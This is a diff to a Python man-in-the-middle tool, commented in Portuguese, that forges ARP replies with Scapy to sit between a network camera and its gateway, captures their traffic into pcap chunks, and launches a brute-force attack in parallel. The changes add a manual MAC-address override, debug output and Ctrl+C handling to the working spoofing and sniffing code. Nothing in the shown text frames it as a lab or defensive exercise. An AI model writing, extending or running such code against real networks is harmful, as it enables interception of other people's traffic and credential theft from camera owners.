@@ -15,6 +15,14 @@ redirecionando o tráfego e capturando pacotes. Necessário rodar como administr
 def get_mac(ip, iface=None):
     """Obtém o endereço MAC de um IP na rede, compatível com Windows."""
     import platform
+    # Permite MAC manual via variável global
+    global MANUAL_MACS
+    if 'MANUAL_MACS' in globals():
+        print(f"[DEBUG] MANUAL_MACS: {MANUAL_MACS}")
+        print(f"[DEBUG] Buscando MAC para IP: {ip}")
+        if ip in MANUAL_MACS:
+            print(f"[DEBUG] Usando MAC manual para {ip}: {MANUAL_MACS[ip]}")
+            return MANUAL_MACS[ip]
     if platform.system() == "Windows":
         # Tenta obter do cache ARP
         import subprocess
@@ -43,8 +51,9 @@ def spoof(target_ip, spoof_ip, iface):
     target_mac = get_mac(target_ip, iface)
     if not target_mac:
         print(f"[ERRO] Não foi possível obter MAC de {target_ip}")
+        print(f"[BUG] target_ip: {target_ip} | iface: {iface}")
         return
-    # Cria pacote ARP dentro de Ether para evitar warnings do Scapy
+    print(f"[DEBUG] Enviando ARP spoof para {target_ip} ({target_mac}) via iface {iface}")
     packet = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     send(packet, iface=iface, verbose=0)
 
@@ -96,37 +105,26 @@ def mitm_attack(camera_ip, gateway_ip, iface=None, pcap_file="mitm_capture.pcap"
     except Exception as e:
         print(f"[ERRO] Não foi possível iniciar brute force em paralelo: {e}")
 
+    # Não pedir input de MAC aqui! Apenas usar MANUAL_MACS se existir
+
     # Cria pasta para chunks
     chunk_dir = os.path.join(os.path.dirname(__file__), 'mitm_chunks')
     if os.path.exists(chunk_dir):
         shutil.rmtree(chunk_dir)
     os.makedirs(chunk_dir)
 
-    print("[INFO] Capturando pacotes e salvando em chunks... (aperte Q + Enter para finalizar a qualquer momento)")
-    import threading as th
+    print("[INFO] Capturando pacotes e salvando em chunks... (aperte Ctrl+C para finalizar a qualquer momento)")
     chunk_size = 0
     chunk_max = 5
     all_packets = []
-    user_exit = {'stop': False}
-
-    def quick_exit_listener():
-        while True:
-            key = input().strip().lower()
-            if key == 'q':
-                user_exit['stop'] = True
-                print('[INFO] Quick exit solicitado pelo usuário.')
-                break
-
-    listener_thread = th.Thread(target=quick_exit_listener, daemon=True)
-    listener_thread.start()
-
     try:
         for chunk_idx in range(chunk_max):
-            if user_exit['stop']:
-                print('[INFO] Quick exit: finalizando captura.')
-                break
             print(f"[INFO] Capturando chunk {chunk_idx+1}/{chunk_max}...")
-            chunk_pkts = sniff(filter=f"host {camera_ip} or host {gateway_ip}", iface=iface, timeout=12)
+            try:
+                chunk_pkts = sniff(filter=f"host {camera_ip} or host {gateway_ip}", iface=iface, timeout=12)
+            except KeyboardInterrupt:
+                print("[!] Interrompido pelo usuário durante a captura.")
+                break
             all_packets.extend(chunk_pkts)
             chunk_file = os.path.join(chunk_dir, f"chunk_{chunk_idx+1}.pcap")
             wrpcap(chunk_file, chunk_pkts)
